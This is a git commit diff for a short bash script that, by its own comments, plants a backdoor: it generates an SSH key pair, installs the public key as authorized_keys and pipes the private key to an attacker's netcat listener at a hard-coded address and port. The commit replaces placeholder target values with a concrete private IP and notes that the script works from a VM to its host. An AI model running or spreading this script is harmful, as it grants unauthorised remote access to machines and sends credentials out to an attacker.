7fe063c1e32faeb6111cac6376a0e54f241fe3ae
Caroline Richards <caroline.piper.richards@gmail.com>
2024-10-18 00:57:48 -0400

    test keys

--- maybe_keys_for_me.sh
+++ maybe_keys_for_me.sh
@@ -1,12 +1,14 @@
 #!/bin/bash
 
 #creates new ssh key, sends new private key back to attacker
-#I have NO idea if this would work
+#this works pretty well from VM to host right now
+#just on host set up nc listen on port to receive key
+#as long as ssh enabled no root required?
 
-cd /
+cd ~
 mkdir .ssh
 cd .ssh
 ssh-keygen -f new_key -N ""
 mv new_key.pub authorized_keys
 chmod 600 new_key
-cat new_key | nc target_ip target_port -q 
+cat new_key | nc 172.16.246.1 4444 -q 0
